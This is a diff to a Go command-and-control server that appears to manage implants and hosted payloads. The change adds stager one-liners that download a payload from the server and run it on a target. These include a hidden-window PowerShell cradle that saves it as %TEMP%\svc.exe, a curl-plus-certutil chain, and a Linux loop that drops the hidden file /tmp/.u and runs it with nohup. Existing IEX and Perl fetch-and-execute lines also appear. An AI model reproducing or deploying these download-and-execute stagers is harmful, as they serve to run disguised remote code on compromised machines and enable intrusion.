@@ -133,14 +133,17 @@ func (s *Server) implantDataDir() string {
 	return "data"
 }
 
-// cleanupOldPayloads removes hosted payloads older than 1 hour
+// cleanupOldPayloads removes hosted payloads older than HostedPayloadTTL.
+// gin's c.File/c.FileAttachment (serveFileSafe) already honors Range/HEAD via
+// http.ServeContent, so interrupted downloads can resume with curl -C - while
+// the payload is retained.
 func (s *Server) cleanupOldPayloads() {
 	payloadsDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
 	entries, err := os.ReadDir(payloadsDir)
 	if err != nil {
 		return
 	}
-	cutoff := time.Now().Add(-GhostAgentCutoff)
+	cutoff := time.Now().Add(-HostedPayloadTTL)
 	for _, e := range entries {
 		if !e.IsDir() {
 			continue
@@ -164,8 +167,11 @@ type oneLinerItem struct {
 	Desc    string `json:"desc"`
 }
 
-// buildOneLiners generates all one-liner variants based on payload type
-func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []oneLinerItem {
+// buildOneLiners generates all one-liner variants based on payload type.
+// sha256hex (may be "") powers the verified variants: the target recomputes
+// the hash after download/resume and only executes on match, and curl-based
+// variants use -C - so interrupted downloads resume instead of restarting.
+func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy, sha256hex string) []oneLinerItem {
 	var items []oneLinerItem
 
 	switch payloadType {
@@ -212,6 +218,22 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
 				payloadURL),
 		})
+		if sha256hex != "" {
+			items = append(items, oneLinerItem{
+				Name: "PowerShell Download + Verify (SHA256 + retry)",
+				Desc: "Download with retries, verify SHA-256, execute only on match",
+				Command: fmt.Sprintf(
+					`powershell -nop -w hidden -c "$u='%s';$p='$env:TEMP\svc.exe';$h='%s';for($i=0;$i -lt 3;$i++){$o=0;try{& curl.exe -sL -C - $u -o $p}catch{};try{$o=(Get-FileHash $p -Algorithm SHA256).Hash}catch{};if($o -eq $h){Start-Process $p;break};Start-Sleep 3}"`,
+					payloadURL, sha256hex),
+			})
+			items = append(items, oneLinerItem{
+				Name: "curl.exe resume + verify",
+				Desc: "Resumable download (curl -C -) with SHA-256 check",
+				Command: fmt.Sprintf(
+					`curl -sL -C - %s -o %%TEMP%%\svc.exe & certutil -hashfile %%TEMP%%\svc.exe SHA256 | findstr /i %s && start /b %%TEMP%%\svc.exe`,
+					payloadURL, sha256hex),
+			})
+		}
 
 	case "ps1":
 		// URL-based download cradle
@@ -278,6 +300,15 @@ func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []
 				`perl -e "use LWP::Simple;getstore('%s','/tmp/.u');chmod 0755,'/tmp/.u';system('/tmp/.u &')"`,
 				payloadURL),
 		})
+		if sha256hex != "" {
+			items = append(items, oneLinerItem{
+				Name: "curl resume + verify",
+				Desc: "Resumable download with SHA-256 check before exec",
+				Command: fmt.Sprintf(
+					`for i in 1 2 3; do curl -sL -C - %s -o /tmp/.u && echo '%s  /tmp/.u' | sha256sum -c - && chmod +x /tmp/.u && nohup /tmp/.u & break; sleep 3; done`,
+					payloadURL, sha256hex),
+			})
+		}
 	}
 
 	return items
